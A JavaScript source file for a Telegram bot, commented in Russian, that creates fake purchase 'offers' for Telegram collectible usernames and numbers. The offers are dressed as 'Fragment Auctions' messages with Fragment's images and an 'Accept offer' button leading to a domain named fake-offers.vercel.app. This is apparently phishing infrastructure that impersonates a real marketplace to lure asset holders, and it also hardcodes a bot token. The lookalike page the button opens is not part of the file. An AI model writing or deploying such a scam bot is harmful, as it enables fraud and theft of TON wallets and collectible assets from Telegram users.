// api/bot.js
import { Telegraf, Markup } from 'telegraf';
import { Address } from '@ton/core';
import crypto from 'crypto';

// ==========================================
// НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ СЮДА)
// ==========================================
const BOT_TOKEN = "9136335540:AAEN-2dE4xNA8iCrm_y_JnXu_mEC6LiRz44"; // Твой токен
const BOT_URL = "https://fake-offers.vercel.app"; // Твой домен на Vercel
const LOG_CHAT_ID = "-100123456789"; // Твой ID для логов (если нужны)
// ==========================================

// Временное хранилище (на Vercel сбрасывается при перезагрузке)
global.offers = global.offers || new Map();
global.userStates = global.userStates || new Map();

const bot = new Telegraf(BOT_TOKEN);

// --- КОМАНДА /START ---
bot.start((ctx) => {
    ctx.replyWithHTML(
        `👋 Привет, <b>${ctx.from.first_name}</b>!\n\n` +
        `Я бот для создания офферов на покупку юзернеймов.\n` +
        `Напиши /hwork, чтобы создать оффер.`
    );
});

// --- КОМАНДА /hwork ---
bot.command('hwork', (ctx) => {
    global.userStates.set(ctx.from.id, { step: 'target' });
    ctx.reply("Шаг 1 из 3: Введите юзернейм (без @) или номер (+888...):");
});

// --- ОБРАБОТКА ТЕКСТА ---
bot.on('text', async (ctx) => {
    const state = global.userStates.get(ctx.from.id);
    if (!state) return;
    const text = ctx.message.text.trim();

    if (state.step === 'target') {
        state.target = text;
        state.isNumber = text.startsWith('+');
        state.step = 'price';
        global.userStates.set(ctx.from.id, state);
        return ctx.reply(`Цель: ${state.target}. Теперь введите цену в TON:`);
    }

    if (state.step === 'price') {
        const price = parseFloat(text);
        if (isNaN(price) || price <= 0) return ctx.reply("Ошибка: введите число.");
        state.price = price;
        state.step = 'address';
        global.userStates.set(ctx.from.id, state);
        return ctx.reply(`Цена: ${price} TON. Введите ваш TON-кошелек (UQ...):`);
    }

    if (state.step === 'address') {
        try {
            Address.parse(text); 
            const offerId = crypto.randomBytes(4).toString('hex');
            
            global.offers.set(offerId, {
                id: offerId,
                target: state.target,
                isNumber: state.isNumber,
                price: state.price,
                buyerAddress: text,
                creatorId: ctx.from.id,
                status: 'active'
            });

            global.userStates.delete(ctx.from.id);
            
            const offerUrl = `${BOT_URL}/?offer_id=${offerId}`;
            
            const rawNumber = state.target.replace('+', '').replace(/\s/g, '');
            const imgUrl = state.isNumber 
                ? `https://nft.fragment.com/number/${rawNumber}.webp` 
                : `https://nft.fragment.com/username/${state.target}.webp`;

            const title = state.isNumber ? state.target : `@${state.target}`;
            
            const textMessage = `
🔥 <b>Fragment Auctions</b>
<b>Buy ${title}</b>
Check the current availability of ${title}, a collectible ${state.isNumber ? 'number' : 'username'} for Telegram.

Пользователь @${ctx.from.username || ctx.from.first_name} предлагает <b>${state.price} TON</b> за этот актив.
`;

            try {
                await ctx.replyWithPhoto(imgUrl, {
                    caption: textMessage,
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard([
                        [Markup.button.webApp("Принять оффер", offerUrl)],
                        [Markup.button.callback("Отклонить", `reject_${offerId}`)]
                    ])
                });
            } catch (e) {
                await ctx.replyWithHTML(textMessage, {
                    ...Markup.inlineKeyboard([
                        [Markup.button.webApp("Принять оффер", offerUrl)],
                        [Markup.button.callback("Отклонить", `reject_${offerId}`)]
                    ])
                });
            }

        } catch (e) {
            return ctx.reply("Ошибка: неверный формат кошелька.");
        }
    }
});

// --- ОТКЛОНЕНИЕ ---
bot.action(/^reject_(.+)$/, async (ctx) => {
    const offerId = ctx.match[1];
    const offer = global.offers.get(offerId);

    if (!offer) return ctx.answerCbQuery("Оффер не найден");
    if (ctx.from.id !== offer.creatorId) return ctx.answerCbQuery("Вы не создатель оффера!");

    offer.status = 'rejected';
    global.offers.set(offerId, offer);

    try {
        const caption = ctx.callbackQuery.message.caption || "Оффер";
        await ctx.editMessageCaption(
            `${caption}\n\n❌ <b>Оффер отклонен</b>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [] } }
        );
    } catch (e) {}
    
    ctx.answerCbQuery("Оффер отклонен");
});

// --- ВЕБХУК ДЛЯ VERCEL ---
export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            await bot.handleUpdate(req.body);
            return res.status(200).send('OK');
        } catch (e) {
            console.error(e);
            return res.status(500).send('Error');
        }
    }
    res.status(200).send('Bot webhook is running');
}
